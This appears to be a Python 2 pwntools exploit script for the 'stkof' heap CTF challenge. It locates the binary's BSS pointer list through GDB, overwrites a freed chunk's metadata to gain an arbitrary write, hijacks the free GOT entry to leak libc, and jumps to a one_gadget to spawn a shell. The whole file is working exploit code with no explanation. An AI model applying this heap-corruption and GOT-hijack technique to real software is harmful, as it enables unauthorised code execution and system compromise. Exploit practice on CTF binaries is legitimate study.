from pwn import *
from GdbWrapper import GdbWrapper

context.log_level = "info"
context.endian = "little"
context.word_size = 64
context.os = "linux"
context.arch = "amd64"
context.terminal = ["deepin-terminal", "-x", "zsh", "-c"]
global io

def Alloc(size):
    io.sendline("1")
    io.sendline(str(size))
    io.readline()
    io.readline()
def Edit(index, length, buf):
    io.sendline("2")
    io.sendline(str(index))
    io.sendline(str(length))
    io.send(buf)
    io.readline()
def Free(index):
    io.sendline("3")
    io.sendline(str(index))
    try:
        tmp = io.readline(timeout = 3)
    except Exception:
        io.interactive()
    print tmp
    if "OK" not in tmp and "FAIL" not in tmp:
        return tmp

if __name__ == "__main__":
    #test env
    binary = "./bins/a679df07a8f3a8d590febad45336d031-stkof"
    bss_ptrlist = None
    free_index = None
    free_try = 2
    while bss_ptrlist == None:
    #find bss ptr
        io = process("./bins/a679df07a8f3a8d590febad45336d031-stkof")
        gdbwrapper = GdbWrapper(io.pid)
        #gdb.attach(io)
        Alloc(0x400)
        Edit(1, 0x400, "a" * 0x400)
        Alloc(0x400)
        Edit(2, 0x400, "b" * 0x400)
        Alloc(0x400)
        Edit(3, 0x400, "c" * 0x400)
        Alloc(0x400)
        Edit(4, 0x400, "d" * 0x400)
        Alloc(0x400)
        Edit(5, 0x400, "e" * 0x400)
        heap = gdbwrapper.heap()
        heap = [(k, heap[k]) for k in sorted(heap.keys())]
        ptr_addr = []
        index = 1
        while True:
            for chunk in heap:
                address = chunk[0]
                info = chunk[1]
                ptr_addr_length = len(ptr_addr)
                if (info["mchunk_size"] & 0xfffffffffffffffe) == 0x410:
                    for x in gdbwrapper.search("bytes", str(chr(ord('a') + index - 1)) * 0x400):
                        if int(address, 16) + 0x10 == x["ADDR"]:
                            tmp = gdbwrapper.search("qword", x["ADDR"])
                            for y in tmp:
                                if binary.split("/")[-1] in y["PATH"]:
                                    ptr_addr.append(y["ADDR"])
                                    break
                        if(len(ptr_addr) != ptr_addr_length):
                            break
                if len(ptr_addr) != ptr_addr_length:
                    break
            index += 1
            if(index == 5):
                break
        bss_ptrlist = sorted(ptr_addr)[0]
        io.close()
    while free_index == None:
        io = process(binary)
        Alloc(0x400)
        Alloc(0x400)
        Alloc(0x400)
        Free(free_try)
        Edit(free_try -1, 0x400 + 0x18, "a" * 0x400 + p64(0) + p64(1041) + p64(0x12345678))
        try:
            Alloc(0x400)
            Alloc(0x400)
        except Exception:
            free_index = free_try
        free_try += 1
        io.close()
    #arbitrary write
    from one_gadget import generate_one_gadget
    libc = ELF(binary).libc
    one_gadget_offsets =generate_one_gadget(libc.path)
    for one_gadget_offset in one_gadget_offsets:
        io = process(binary)
        elf = ELF(binary)
        libc = elf.libc
        gdbwrapper = GdbWrapper(io.pid)
        Alloc(0x400)
        Alloc(0x400)
        Alloc(0x400)
        Free(free_index)
        Edit(free_index - 1, 0x400 + 0x18, "a" * 0x400 + p64(0) + p64(1041) + p64(bss_ptrlist - 0x08))
        Alloc(0x400)
        Alloc(0x400)
        ###leak libc
        Edit(5, 0x18, p64(elf.got["free"]) * 2 + p64(elf.got["malloc"]))
        Edit(0, 0x08, p64(elf.plt["puts"]))
        leaked = u64(Free(2)[:-1].ljust(8, "\x00"))
        libc_base = leaked - libc.symbols["malloc"]
        system_addr = libc_base + libc.symbols["system"]
        one_gadget_addr = libc_base + one_gadget_offset
        Edit(1, 0x08, p64(one_gadget_addr))
        Free(1)
        try:
            io.sendline("id")
            log.info(io.readline(timeout = 3))
        except Exception,e:
            io.close()
            continue
        io.interactive()

